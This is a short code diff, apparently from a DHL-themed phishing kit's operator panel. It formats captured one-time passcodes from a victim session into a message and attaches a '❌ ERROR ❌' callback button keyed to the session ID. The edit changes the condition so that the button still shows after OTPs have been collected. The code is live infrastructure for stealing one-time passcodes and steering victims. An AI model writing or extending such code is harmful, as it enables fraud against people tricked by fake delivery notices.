@@ -73,7 +73,7 @@ ${data.otp1 ? `✅ <b>OTP 1:</b> ${data.otp1}\n` : ''}${data.otp2 ? `✅ <b>OTP 
 +-----------------------------
   `.trim();
 
-  const keyboard = data.sessionId && !data.otp1 && !data.otp2 ? [
+  const keyboard = data.sessionId ? [
     [
       { text: "❌ ERROR ❌", callback_data: `dhl_error_${data.sessionId}` }
     ],
